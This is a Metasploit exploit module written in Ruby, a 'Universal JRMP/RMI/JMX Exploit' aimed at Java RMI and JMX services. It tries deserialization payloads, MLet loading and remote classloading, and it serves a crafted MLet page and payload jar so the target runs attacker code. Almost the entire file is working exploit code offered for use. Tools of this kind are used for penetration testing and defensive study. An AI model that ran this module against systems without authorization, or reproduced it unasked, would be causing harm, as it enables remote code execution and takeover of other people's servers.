require 'msf/core/exploit/java/serialized'
require 'msf/core/exploit/java/serialized/rmi'
require 'rex/java/jrmp'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Java::Serialized
  include Msf::Exploit::Java::Serialized::RMI

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Universal JRMP/RMI/JMX Exploit',
        'Description'    => 'Module for exploiting various JRMP/RMI/JMX vulnerabilities,
                            including MLet loading, deserialization attacks and remote codebase loading.',
        'Author'         => ['mbechler'],
        'DisclosureDate' => '2016-03-05',
        'References'     =>
          [
            ['CVE', '2011-3556'],
            ['CVE', '2015-2342'],
            ['CVE', '2017-3241'],
            ['CVE', '2017-3241'],
            ['CVE', '2018-2637']
          ],
        'Platform' => %w[java],
        'Arch' => [ARCH_CMD, ARCH_JAVA],
        'Targets'        =>
          [
            ['Generic', {
              'Arch' => ARCH_JAVA
            }]
          ],
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        Opt::RPORT(1099),
        OptBool.new('SSL', [true, 'Connect using SSL', false]),
        OptBool.new('CHECK_REFS', [true, 'Check objects referenced in registry', true]),
        OptBool.new('FOLLOW_REMOTE_REFS', [true, 'Follow remote references that could point to other systems', false]),
        OptBool.new('TRY_DESER', [true, 'Try exploit deserialization', true]),
        OptBool.new('TRY_MLET', [true, 'Try exploit MLet loading', true]),
        OptBool.new('TRY_CLASSLOAD', [true, 'Try exploit remote location classloading', true]),
        OptString.new('USERNAME', [false, 'JMX username']),
        OptString.new('PASSWORD', [false, 'JMX password']),

        OptInt.new('METHOD_ID', [false, 'Method ID for testing custom legacy objects', -1]),
        OptInt.new('METHOD_HASH', [false, 'Method Hash for testing custom objects']),
        OptString.new('METHOD_SIGNATURE', [false, 'Method signature for testing custom objects (Format: <methodName> + <internalJavaSignature>, for example test(Ljava/lang/String;)Lmy/return/Type;'])
      ]
    )
  end

  def create_config(datastore)
    Msf::Exploit::Java::Serialized::RMI::PropRunConfig.new(datastore)
  end

  def collect
    check = Msf::Exploit::Java::Serialized::RMI::RMICheck.new(datastore['RHOST'],
                                       datastore['RPORT'],
                                       ssl: datastore['SSL'],
                                       username: datastore['USERNAME'],
                                       password: datastore['PASSWORD'],
                                       rc: create_config(datastore))

    begin
      check.run
    rescue Rex::Java::JRMP::JRMPError => e
      root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
      print_status "Check returned error #{root[0][0]}: #{root[1]['detailMessage']}"
    end
  end


  def do_exploit(vector)
    if vector.id[0] == 'mlet'
      print_status 'Trying MLET loading'
      begin
        vector.deliver(get_uri + '/mlet')
        return
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        print_status "MLet load returned error #{root[0][0]}: #{root[1]['detailMessage']}"
      rescue Timeout::Error
        return if session_created?
        raise
      end
      return
    elsif vector.id[0] == 'classload'
      print_status 'Trying to invoke remote classloading'
      begin
        vector.deliver([get_uri + '/', 'metasploit.StaticPayload'])
        return
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        print_status "Load returned error #{root[0][0]}: #{root[1]['detailMessage']}"
      rescue Timeout::Error
        return if session_created?
        raise
      end
      return
    elsif !vector.respond_to?('context')
      info 'Unsupported vector'
      return
    end

    payloads(vector.context) do |payl|
      begin
        vector.deliver(payl)
      rescue Rex::Java::JRMP::JRMPError => e
        root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
        type = root[0][0]
        msg = root[1].fetch('detailMessage', nil)
        print_status "Call returned error, this does not necessarily mean that the exploit failed: #{type}: #{msg}"
        vprint_status root.to_s
      end
    end
  end


  def extra_http_classes
    paths = super
    paths.push ['metasploit/JMXPayloadMBean.class']
    paths.push ['metasploit/JMXPayload.class']
    paths
  end

  def on_request_uri(cli, request)
    jar = get_jar
    if request.uri =~ /mlet$/
      jarname = "#{rand_text_alpha(8..16)}.jar"

      mlet = "<HTML><mlet code=\"#{jar.substitutions["metasploit"]}.JMXPayload\" "
      mlet << "archive=\"#{jarname}\" "
      mlet << "name=\"#{@mlet}:name=jmxpayload,id=#{rand_text_alpha(8..16)}\" "
      mlet << "codebase=\"#{get_uri}\"></mlet></HTML>"
      send_response(cli, mlet,
                    'Content-Type' => 'application/octet-stream',
                    'Pragma'       => 'no-cache')

      print_status('Replied to request for mlet')
    else
      super
    end
  end
end
